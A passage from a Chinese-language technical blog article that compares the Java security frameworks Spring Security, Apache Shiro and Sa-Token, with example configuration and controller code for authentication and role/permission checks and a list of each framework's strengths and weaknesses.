                .antMatchers(<span class="hljs-string">"/api/user/**"</span>).hasAnyRole(<span class="hljs-string">"USER"</span>, <span class="hljs-string">"ADMIN"</span>)  <span class="hljs-comment">// 需要用户角色</span>
                .anyRequest().authenticated()  <span class="hljs-comment">// 其他所有请求需要认证</span>
            
            <span class="hljs-comment">// 表单登录配置（前后端分离时通常用不上）</span>
            .and()
            .formLogin().disable()
            
            <span class="hljs-comment">// 基础认证配置</span>
            .httpBasic()
            
            <span class="hljs-comment">// 异常处理</span>
            .and()
            .exceptionHandling()
                .authenticationEntryPoint(restAuthenticationEntryPoint())  <span class="hljs-comment">// 未认证处理</span>
                .accessDeniedHandler(restAccessDeniedHandler());  <span class="hljs-comment">// 权限不足处理</span>
    }
    
    <span class="hljs-comment">// 2. 用户详情服务（从数据库加载用户）</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> UserDetailsService <span class="hljs-title function_">userDetailsService</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> username -&gt; {
            <span class="hljs-comment">// 这里实际应该查询数据库</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-string">"admin"</span>.equals(username)) {
                <span class="hljs-keyword">return</span> User.withUsername(<span class="hljs-string">"admin"</span>)
                    .password(passwordEncoder().encode(<span class="hljs-string">"admin123"</span>))
                    .roles(<span class="hljs-string">"ADMIN"</span>)
                    .build();
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">"user"</span>.equals(username)) {
                <span class="hljs-keyword">return</span> User.withUsername(<span class="hljs-string">"user"</span>)
                    .password(passwordEncoder().encode(<span class="hljs-string">"user123"</span>))
                    .roles(<span class="hljs-string">"USER"</span>)
                    .build();
            }
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UsernameNotFoundException</span>(<span class="hljs-string">"用户不存在: "</span> + username);
        };
    }
    
    <span class="hljs-comment">// 3. 密码编码器</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> PasswordEncoder <span class="hljs-title function_">passwordEncoder</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BCryptPasswordEncoder</span>();
    }
    
    <span class="hljs-comment">// 4. REST API认证入口点</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> AuthenticationEntryPoint <span class="hljs-title function_">restAuthenticationEntryPoint</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> (request, response, authException) -&gt; {
            response.setContentType(MediaType.APPLICATION_JSON_VALUE);
            response.setStatus(HttpStatus.UNAUTHORIZED.value());
            response.getWriter().write(
                <span class="hljs-string">"{\"code\": 401, \"message\": \"未认证，请先登录\"}"</span>
            );
        };
    }
}

<span class="hljs-comment">// 5. 在Controller中使用安全注解</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/api")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductController</span> {
    
    <span class="hljs-meta">@GetMapping("/public/products")</span>
    <span class="hljs-keyword">public</span> List&lt;Product&gt; <span class="hljs-title function_">getPublicProducts</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 公开接口，无需认证</span>
        <span class="hljs-keyword">return</span> productService.getAllProducts();
    }
    
    <span class="hljs-meta">@GetMapping("/user/products")</span>
    <span class="hljs-meta">@PreAuthorize("hasRole('USER')")</span>  <span class="hljs-comment">// 需要USER角色</span>
    <span class="hljs-keyword">public</span> List&lt;Product&gt; <span class="hljs-title function_">getUserProducts</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 获取当前认证用户</span>
        <span class="hljs-type">Authentication</span> <span class="hljs-variable">auth</span> <span class="hljs-operator">=</span> SecurityContextHolder.getContext().getAuthentication();
        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> auth.getName();
        
        <span class="hljs-keyword">return</span> productService.getProductsByOwner(username);
    }
    
    <span class="hljs-meta">@PostMapping("/admin/products")</span>
    <span class="hljs-meta">@PreAuthorize("hasRole('ADMIN')")</span>  <span class="hljs-comment">// 需要ADMIN角色</span>
    <span class="hljs-keyword">public</span> Product <span class="hljs-title function_">createProduct</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> ProductDTO dto)</span> {
        <span class="hljs-keyword">return</span> productService.createProduct(dto);
    }
    
    <span class="hljs-meta">@DeleteMapping("/admin/products/{id}")</span>
    <span class="hljs-meta">@PreAuthorize("hasPermission(#id, 'product', 'delete')")</span>  <span class="hljs-comment">// 方法级权限控制</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteProduct</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
        productService.deleteProduct(id);
    }
}
</code></pre>
<h3 data-id="heading-6">Spring Security的优势与痛点</h3>
<p><strong>优势：</strong></p>
<ol>
<li><strong>Spring生态原生支持</strong>：与Spring Boot、Spring Cloud无缝集成</li>
<li><strong>功能全面</strong>：认证、授权、防护（CSRF、CORS、点击劫持等）一应俱全</li>
<li><strong>高度可定制</strong>：几乎每个组件都可以自定义或替换</li>
<li><strong>社区强大</strong>：Spring官方维护，文档完善，社区活跃</li>
<li><strong>企业级特性</strong>：OAuth2、SAML、LDAP等企业级集成支持</li>
</ol>
<p><strong>痛点：</strong></p>
<ol>
<li><strong>学习曲线陡峭</strong>：概念复杂，配置繁琐</li>
<li><strong>过度设计感</strong>：简单需求也需要复杂配置</li>
<li><strong>调试困难</strong>：过滤器链复杂，问题定位困难</li>
<li><strong>性能开销</strong>：完整的过滤器链带来一定性能损失</li>
</ol>
<p><strong>适用场景：</strong></p>
<ul>
<li>大型企业级应用</li>
<li>需要与Spring生态深度集成的项目</li>
<li>需要OAuth2、LDAP等企业级认证协议的项目</li>
<li>团队有Spring Security经验的场景</li>
</ul>
<p>有些小伙伴刚开始学Spring Security时，可能会被它复杂的概念搞晕，比如：<code>SecurityContext</code>、<code>Authentication</code>、<code>UserDetails</code>、<code>GrantedAuthority</code>等等。</p>
<p>但一旦掌握了它的设计哲学，你会发现它真的很强大。</p>
<h2 data-id="heading-7">3 Apache Shiro：简单直观的“轻骑兵”</h2>
<h3 data-id="heading-8">3.1 Shiro是什么？</h3>
<p>Apache Shiro是一个功能强大且易于使用的Java安全框架，它的设计哲学是：<strong>简化应用安全，让安全变得更简单</strong>。</p>
<p>如果说Spring Security是重型坦克，那么Shiro就是灵活机动的轻骑兵。</p>
<h3 data-id="heading-9">3.2 核心架构：四大核心概念</h3>
<p>Shiro的架构围绕四个核心概念构建：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c09f44fd817149d59381c390cbde4d5b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767613200&amp;x-signature=s8iIMYEWyFWNIkM7mUBx4U4h%2Fto%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-10">3.3 快速实现基于URL的权限控制</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. Shiro配置类</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShiroConfig</span> {
    
    <span class="hljs-comment">// 创建ShiroFilterFactoryBean</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> ShiroFilterFactoryBean <span class="hljs-title function_">shiroFilterFactoryBean</span><span class="hljs-params">(
            SecurityManager securityManager)</span> {
        <span class="hljs-type">ShiroFilterFactoryBean</span> <span class="hljs-variable">factoryBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShiroFilterFactoryBean</span>();
        factoryBean.setSecurityManager(securityManager);
        
        <span class="hljs-comment">// 设置登录页面</span>
        factoryBean.setLoginUrl(<span class="hljs-string">"/login"</span>);
        <span class="hljs-comment">// 设置未授权页面</span>
        factoryBean.setUnauthorizedUrl(<span class="hljs-string">"/unauthorized"</span>);
        
        <span class="hljs-comment">// 配置拦截规则</span>
        Map&lt;String, String&gt; filterChainDefinitionMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;&gt;();
        
        <span class="hljs-comment">// 静态资源放行</span>
        filterChainDefinitionMap.put(<span class="hljs-string">"/static/**"</span>, <span class="hljs-string">"anon"</span>);
        filterChainDefinitionMap.put(<span class="hljs-string">"/css/**"</span>, <span class="hljs-string">"anon"</span>);
        filterChainDefinitionMap.put(<span class="hljs-string">"/js/**"</span>, <span class="hljs-string">"anon"</span>);
        
        <span class="hljs-comment">// 公开接口</span>
        filterChainDefinitionMap.put(<span class="hljs-string">"/api/public/**"</span>, <span class="hljs-string">"anon"</span>);
        filterChainDefinitionMap.put(<span class="hljs-string">"/login"</span>, <span class="hljs-string">"anon"</span>);
        
        <span class="hljs-comment">// 需要认证的接口</span>
        filterChainDefinitionMap.put(<span class="hljs-string">"/api/user/**"</span>, <span class="hljs-string">"authc"</span>);
        filterChainDefinitionMap.put(<span class="hljs-string">"/api/admin/**"</span>, <span class="hljs-string">"authc, roles[admin]"</span>);
        
        <span class="hljs-comment">// 需要特定权限的接口</span>
        filterChainDefinitionMap.put(<span class="hljs-string">"/api/products/create"</span>, <span class="hljs-string">"authc, perms[product:create]"</span>);
        filterChainDefinitionMap.put(<span class="hljs-string">"/api/products/delete/*"</span>, <span class="hljs-string">"authc, perms[product:delete]"</span>);
        
        <span class="hljs-comment">// 其他所有请求需要认证</span>
        filterChainDefinitionMap.put(<span class="hljs-string">"/**"</span>, <span class="hljs-string">"authc"</span>);
        
        factoryBean.setFilterChainDefinitionMap(filterChainDefinitionMap);
        <span class="hljs-keyword">return</span> factoryBean;
    }
    
    <span class="hljs-comment">// 创建SecurityManager</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> SecurityManager <span class="hljs-title function_">securityManager</span><span class="hljs-params">()</span> {
        <span class="hljs-type">DefaultWebSecurityManager</span> <span class="hljs-variable">securityManager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultWebSecurityManager</span>();
        
        <span class="hljs-comment">// 设置Realm</span>
        securityManager.setRealm(customRealm());
        
        <span class="hljs-comment">// 设置Session管理器</span>
        securityManager.setSessionManager(sessionManager());
        
        <span class="hljs-comment">// 设置缓存管理器</span>
        securityManager.setCacheManager(cacheManager());
        
        <span class="hljs-keyword">return</span> securityManager;
    }
    
    <span class="hljs-comment">// 自定义Realm（连接安全数据源）</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Realm <span class="hljs-title function_">customRealm</span><span class="hljs-params">()</span> {
        <span class="hljs-type">CustomRealm</span> <span class="hljs-variable">realm</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomRealm</span>();
        
        <span class="hljs-comment">// 设置密码匹配器</span>
        <span class="hljs-type">HashedCredentialsMatcher</span> <span class="hljs-variable">credentialsMatcher</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashedCredentialsMatcher</span>();
        credentialsMatcher.setHashAlgorithmName(<span class="hljs-string">"SHA-256"</span>);
        credentialsMatcher.setHashIterations(<span class="hljs-number">1024</span>);
        credentialsMatcher.setStoredCredentialsHexEncoded(<span class="hljs-literal">false</span>);
        realm.setCredentialsMatcher(credentialsMatcher);
        
        <span class="hljs-comment">// 开启缓存</span>
        realm.setCachingEnabled(<span class="hljs-literal">true</span>);
        realm.setAuthenticationCachingEnabled(<span class="hljs-literal">true</span>);
        realm.setAuthenticationCacheName(<span class="hljs-string">"authenticationCache"</span>);
        realm.setAuthorizationCachingEnabled(<span class="hljs-literal">true</span>);
        realm.setAuthorizationCacheName(<span class="hljs-string">"authorizationCache"</span>);
        
        <span class="hljs-keyword">return</span> realm;
    }
}

<span class="hljs-comment">// 2. 自定义Realm实现</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomRealm</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AuthorizingRealm</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserService userService;
    
    <span class="hljs-comment">// 认证逻辑：验证用户身份</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> AuthenticationInfo <span class="hljs-title function_">doGetAuthenticationInfo</span><span class="hljs-params">(
            AuthenticationToken token)</span> <span class="hljs-keyword">throws</span> AuthenticationException {
        
        <span class="hljs-type">UsernamePasswordToken</span> <span class="hljs-variable">upToken</span> <span class="hljs-operator">=</span> (UsernamePasswordToken) token;
        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> upToken.getUsername();
        
        <span class="hljs-comment">// 从数据库查询用户</span>
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> userService.findByUsername(username);
        <span class="hljs-keyword">if</span> (user == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnknownAccountException</span>(<span class="hljs-string">"用户不存在"</span>);
        }
        
        <span class="hljs-keyword">if</span> (!user.isEnabled()) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DisabledAccountException</span>(<span class="hljs-string">"用户已被禁用"</span>);
        }
        
        <span class="hljs-comment">// 返回认证信息</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleAuthenticationInfo</span>(
            user, <span class="hljs-comment">// 身份 principal</span>
            user.getPassword(), <span class="hljs-comment">// 凭证 credentials</span>
            getName() <span class="hljs-comment">// realm name</span>
        );
    }
    
    <span class="hljs-comment">// 授权逻辑：获取用户的角色和权限</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> AuthorizationInfo <span class="hljs-title function_">doGetAuthorizationInfo</span><span class="hljs-params">(
            PrincipalCollection principals)</span> {
        
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (User) principals.getPrimaryPrincipal();
        <span class="hljs-type">SimpleAuthorizationInfo</span> <span class="hljs-variable">authorizationInfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleAuthorizationInfo</span>();
        
        <span class="hljs-comment">// 添加角色</span>
        Set&lt;String&gt; roles = userService.findRolesByUserId(user.getId());
        authorizationInfo.setRoles(roles);
        
        <span class="hljs-comment">// 添加权限</span>
        Set&lt;String&gt; permissions = userService.findPermissionsByUserId(user.getId());
        authorizationInfo.setStringPermissions(permissions);
        
        <span class="hljs-keyword">return</span> authorizationInfo;
    }
}

<span class="hljs-comment">// 3. 在Controller中使用Shiro</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/api")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductController</span> {
    
    <span class="hljs-meta">@GetMapping("/products")</span>
    <span class="hljs-keyword">public</span> List&lt;Product&gt; <span class="hljs-title function_">getProducts</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 获取当前用户</span>
        <span class="hljs-type">Subject</span> <span class="hljs-variable">currentUser</span> <span class="hljs-operator">=</span> SecurityUtils.getSubject();
        
        <span class="hljs-comment">// 检查是否已认证</span>
        <span class="hljs-keyword">if</span> (!currentUser.isAuthenticated()) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnauthorizedException</span>(<span class="hljs-string">"请先登录"</span>);
        }
        
        <span class="hljs-comment">// 检查是否有权限</span>
        <span class="hljs-keyword">if</span> (!currentUser.isPermitted(<span class="hljs-string">"product:view"</span>)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ForbiddenException</span>(<span class="hljs-string">"没有查看权限"</span>);
        }
        
        <span class="hljs-comment">// 执行业务逻辑</span>
        <span class="hljs-keyword">return</span> productService.getAllProducts();
    }
    
    <span class="hljs-meta">@PostMapping("/products")</span>
    <span class="hljs-keyword">public</span> Product <span class="hljs-title function_">createProduct</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> ProductDTO dto)</span> {
        <span class="hljs-type">Subject</span> <span class="hljs-variable">currentUser</span> <span class="hljs-operator">=</span> SecurityUtils.getSubject();
        
        <span class="hljs-comment">// 使用Shiro的权限注解（需要AOP支持）</span>
        currentUser.checkPermission(<span class="hljs-string">"product:create"</span>);
        
        <span class="hljs-comment">// 或者使用编程式检查</span>
        <span class="hljs-comment">// if (!currentUser.isPermitted("product:create")) {</span>
        <span class="hljs-comment">//     throw new ForbiddenException("没有创建权限");</span>
        <span class="hljs-comment">// }</span>
        
        <span class="hljs-keyword">return</span> productService.createProduct(dto);
    }
    
    <span class="hljs-meta">@GetMapping("/admin/dashboard")</span>
    <span class="hljs-keyword">public</span> DashboardVO <span class="hljs-title function_">getAdminDashboard</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Subject</span> <span class="hljs-variable">currentUser</span> <span class="hljs-operator">=</span> SecurityUtils.getSubject();
        
        <span class="hljs-comment">// 检查是否具有admin角色</span>
        currentUser.checkRole(<span class="hljs-string">"admin"</span>);
        
        <span class="hljs-keyword">return</span> dashboardService.getAdminDashboard();
    }
}
</code></pre>
<h3 data-id="heading-11">Shiro的优势与痛点</h3>
<p><strong>优势：</strong></p>
<ol>
<li><strong>简单直观</strong>：API设计简洁，学习成本低</li>
<li><strong>配置灵活</strong>：支持INI、XML、注解等多种配置方式</li>
<li><strong>功能完整</strong>：认证、授权、会话管理、加密、缓存等一应俱全</li>
<li><strong>不依赖容器</strong>：可以在任何Java环境中运行</li>
<li><strong>易于集成</strong>：与Spring、Spring Boot等框架集成简单</li>
</ol>
<p><strong>痛点：</strong></p>
<ol>
<li><strong>Spring生态整合不够原生</strong>：需要额外配置</li>
<li><strong>社区活跃度下降</strong>：相比Spring Security，社区维护力度减弱</li>
<li><strong>功能扩展性有限</strong>：某些高级功能需要自己实现</li>
<li><strong>文档相对陈旧</strong>：部分文档更新不及时</li>
</ol>
<p><strong>适用场景：</strong></p>
<ul>
<li>中小型项目，追求快速开发</li>
<li>非Spring项目或Spring生态不重的项目</li>
<li>团队对Spring Security不熟悉</li>
<li>需要简单权限控制的内部系统</li>
</ul>
<p>有些小伙伴喜欢Shiro的简洁，特别是它的INI配置文件，几行配置就能搞定基本的权限控制。</p>
<p>但当你需要更复杂的功能时，可能会发现需要自己写不少代码。</p>
<p>最近为了帮助大家找工作，专门建了一些工作内推群，各大城市都有，欢迎各位HR和找工作的小伙伴进群交流，群里目前已经收集了20多家大厂的工作内推岗位。加苏三的微信：li_su223，备注：掘金+所在城市，即可进群。</p>
<h2 data-id="heading-12">4 Sa-Token：国产新星的“后起之秀”</h2>
<h3 data-id="heading-13">4.1 Sa-Token是什么？</h3>
<p>Sa-Token是一个轻量级Java权限认证框架，由国内开发者开发。</p>
<p>它的设计理念是：<strong>以最少的配置，完成最全面的权限认证功能</strong>。</p>
<p>在Spring Security和Shiro之外，Sa-Token提供了一种新的选择。</p>
<h3 data-id="heading-14">4.2 核心特性：简单而强大</h3>
<p>Sa-Token的核心设计哲学可以概括为：“简单、强大、灵活”。</p>
<p>它通过几个核心组件实现了完整的安全控制：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9d275a3bba404e29864406786b42dc4c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767613200&amp;x-signature=7jBSQjBEqNiykOm7%2FrXRTTYONaI%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-15">4.3 5分钟搭建完整权限系统</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. 添加依赖（pom.xml）</span>
<span class="hljs-comment">// &lt;dependency&gt;</span>
<span class="hljs-comment">//     &lt;groupId&gt;cn.dev33&lt;/groupId&gt;</span>
<span class="hljs-comment">//     &lt;artifactId&gt;sa-token-spring-boot-starter&lt;/artifactId&gt;</span>
<span class="hljs-comment">//     &lt;version&gt;1.34.0&lt;/version&gt;</span>
<span class="hljs-comment">// &lt;/dependency&gt;</span>

<span class="hljs-comment">// 2. 配置文件（application.yml）</span>
<span class="hljs-comment">// sa-token:</span>
<span class="hljs-comment">//   token-name: satoken           # token名称</span>
<span class="hljs-comment">//   timeout: 2592000             # token有效期，单位秒，默认30天</span>
<span class="hljs-comment">//   active-timeout: -1           # token活跃有效期，-1代表不限制</span>
<span class="hljs-comment">//   is-concurrent: true          # 是否允许并发登录</span>
<span class="hljs-comment">//   is-share: true               # 在多人登录同一账号时，是否共享token</span>
<span class="hljs-comment">//   max-login-count: 12          # 同一账号最大登录数量</span>
<span class="hljs-comment">//   is-write-header: true        # 是否将token写入响应头</span>
<span class="hljs-comment">//   token-style: uuid            # token风格</span>
<span class="hljs-comment">//   is-log: false                # 是否打印操作日志</span>

<span class="hljs-comment">// 3. 配置类（可选）</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SaTokenConfig</span> {
    
    <span class="hljs-comment">// 注册拦截器</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> SaInterceptor <span class="hljs-title function_">saInterceptor</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SaInterceptor</span>()
            <span class="hljs-comment">// 校验登录状态，不包含登录接口</span>
            .addPathPatterns(<span class="hljs-string">"/**"</span>)
            .excludePathPatterns(<span class="hljs-string">"/api/user/login"</span>)
            .excludePathPatterns(<span class="hljs-string">"/api/public/**"</span>)
            
            <span class="hljs-comment">// 权限校验规则</span>
            .check(r -&gt; {
                <span class="hljs-comment">// 1. 检查登录状态</span>
                SaRouter.match(<span class="hljs-string">"/api/**"</span>, () -&gt; {
                    StpUtil.checkLogin();
                });
                
                <span class="hljs-comment">// 2. 角色校验</span>
                SaRouter.match(<span class="hljs-string">"/api/admin/**"</span>, () -&gt; {
                    StpUtil.checkRole(<span class="hljs-string">"admin"</span>);
                });
                
                <span class="hljs-comment">// 3. 权限校验</span>
                SaRouter.match(<span class="hljs-string">"/api/products/create"</span>, () -&gt; {
                    StpUtil.checkPermission(<span class="hljs-string">"product.create"</span>);
                });
                
                SaRouter.match(<span class="hljs-string">"/api/products/delete/**"</span>, () -&gt; {
                    StpUtil.checkPermission(<span class="hljs-string">"product.delete"</span>);
                });
            });
    }
}

<span class="hljs-comment">// 4. 登录认证Controller</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/api/user")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> {
    
    <span class="hljs-meta">@PostMapping("/login")</span>
    <span class="hljs-keyword">public</span> ApiResult <span class="hljs-title function_">login</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> LoginDTO dto)</span> {
        <span class="hljs-comment">// 1. 验证用户名密码</span>
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> userService.findByUsername(dto.getUsername());
        <span class="hljs-keyword">if</span> (user == <span class="hljs-literal">null</span> || !passwordEncoder.matches(dto.getPassword(), user.getPassword())) {
            <span class="hljs-keyword">return</span> ApiResult.error(<span class="hljs-string">"用户名或密码错误"</span>);
        }
        
        <span class="hljs-comment">// 2. 登录（Sa-Token会自动创建token）</span>
        StpUtil.login(user.getId());
        
        <span class="hljs-comment">// 3. 获取token信息</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">tokenValue</span> <span class="hljs-operator">=</span> StpUtil.getTokenValue();
        <span class="hljs-type">long</span> <span class="hljs-variable">tokenTimeout</span> <span class="hljs-operator">=</span> StpUtil.getTokenTimeout();
        
        <span class="hljs-comment">// 4. 返回用户信息和token</span>
        <span class="hljs-type">LoginVO</span> <span class="hljs-variable">vo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginVO</span>();
        vo.setUserId(user.getId());
        vo.setUsername(user.getUsername());
        vo.setToken(tokenValue);
        vo.setExpireTime(tokenTimeout);
        
        <span class="hljs-comment">// 5. 可以设置一些session信息</span>
        StpUtil.getSession().set(<span class="hljs-string">"userInfo"</span>, user);
        
        <span class="hljs-keyword">return</span> ApiResult.success(<span class="hljs-string">"登录成功"</span>, vo);
    }
    
    <span class="hljs-meta">@PostMapping("/logout")</span>
    <span class="hljs-keyword">public</span> ApiResult <span class="hljs-title function_">logout</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 注销当前会话</span>
        StpUtil.logout();
        <span class="hljs-keyword">return</span> ApiResult.success(<span class="hljs-string">"注销成功"</span>);
    }
    
    <span class="hljs-meta">@GetMapping("/info")</span>
    <span class="hljs-keyword">public</span> ApiResult <span class="hljs-title function_">getUserInfo</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 获取当前登录用户ID</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">loginId</span> <span class="hljs-operator">=</span> StpUtil.getLoginId();
        
        <span class="hljs-comment">// 获取用户信息</span>
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> userService.findById(Long.parseLong(loginId.toString()));
        
        <span class="hljs-comment">// 获取用户权限列表</span>
        List&lt;String&gt; permissionList = StpUtil.getPermissionList();
        
        <span class="hljs-comment">// 获取用户角色列表</span>
        List&lt;String&gt; roleList = StpUtil.getRoleList();
        
        <span class="hljs-type">UserInfoVO</span> <span class="hljs-variable">vo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserInfoVO</span>();
        vo.setUser(user);
        vo.setPermissions(permissionList);
        vo.setRoles(roleList);
        
        <span class="hljs-keyword">return</span> ApiResult.success(vo);
    }
}

<span class="hljs-comment">// 5. 业务Controller中使用</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/api/products")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductController</span> {
    
    <span class="hljs-meta">@GetMapping("/list")</span>
    <span class="hljs-keyword">public</span> ApiResult <span class="hljs-title function_">getProductList</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 无需手动检查登录状态，拦截器已处理</span>
        
        <span class="hljs-comment">// 获取当前登录用户ID</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> StpUtil.getLoginIdAsLong();
        
        List&lt;Product&gt; products = productService.getProductsByOwner(userId);
        <span class="hljs-keyword">return</span> ApiResult.success(products);
    }
    
    <span class="hljs-meta">@PostMapping("/create")</span>
    <span class="hljs-keyword">public</span> ApiResult <span class="hljs-title function_">createProduct</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> ProductDTO dto)</span> {
        <span class="hljs-comment">// 使用注解方式检查权限</span>
        <span class="hljs-comment">// @SaCheckPermission("product.create") 也可以这样用</span>
        
        <span class="hljs-comment">// 编程式检查权限</span>
        StpUtil.checkPermission(<span class="hljs-string">"product.create"</span>);
        
        <span class="hljs-type">long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> StpUtil.getLoginIdAsLong();
        dto.setOwnerId(userId);
        
        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> productService.createProduct(dto);
        <span class="hljs-keyword">return</span> ApiResult.success(product);
    }
    
    <span class="hljs-meta">@DeleteMapping("/{id}")</span>
    <span class="hljs-meta">@SaCheckPermission("product.delete")</span>  <span class="hljs-comment">// 注解方式权限检查</span>
    <span class="hljs-keyword">public</span> ApiResult <span class="hljs-title function_">deleteProduct</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
        <span class="hljs-comment">// 除了权限检查，还可以检查数据权限</span>
        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> productService.getById(id);
        <span class="hljs-type">long</span> <span class="hljs-variable">currentUserId</span> <span class="hljs-operator">=</span> StpUtil.getLoginIdAsLong();
        
        <span class="hljs-keyword">if</span> (product.getOwnerId() != currentUserId) {
            <span class="hljs-comment">// 不是自己的商品，检查是否有管理员权限</span>
            StpUtil.checkRole(<span class="hljs-string">"admin"</span>);
        }
        
        productService.deleteProduct(id);
        <span class="hljs-keyword">return</span> ApiResult.success(<span class="hljs-string">"删除成功"</span>);
    }
    
    <span class="hljs-meta">@GetMapping("/admin/dashboard")</span>
    <span class="hljs-meta">@SaCheckRole("admin")</span>  <span class="hljs-comment">// 注解方式角色检查</span>
    <span class="hljs-keyword">public</span> ApiResult <span class="hljs-title function_">getAdminDashboard</span><span class="hljs-params">()</span> {
        <span class="hljs-type">DashboardVO</span> <span class="hljs-variable">dashboard</span> <span class="hljs-operator">=</span> dashboardService.getAdminDashboard();
        <span class="hljs-keyword">return</span> ApiResult.success(dashboard);
    }
}

<span class="hljs-comment">// 6. 进阶功能：踢人下线、账号封禁</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AdvancedSecurityService</span> {
    
